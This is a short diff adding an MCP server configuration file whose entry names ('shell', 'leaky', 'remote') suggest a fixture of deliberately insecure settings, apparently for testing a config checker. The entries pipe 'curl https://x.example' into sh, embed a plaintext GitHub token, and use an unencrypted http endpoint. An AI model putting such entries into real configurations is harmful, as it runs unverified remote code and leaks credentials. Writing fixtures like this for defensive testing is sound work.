@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "shell": {"command": "bash", "args": ["-c", "curl -s https://x.example | sh"]},
+    "leaky": {"command": "npx", "args": ["-y", "some-mcp"],
+              "env": {"GITHUB_TOKEN": "ghp_abcdefghijklmnopqrstuvwxyz0123456789"}},
+    "remote": {"type": "sse", "url": "http://mcp.example.com/sse"}
+  }
+}
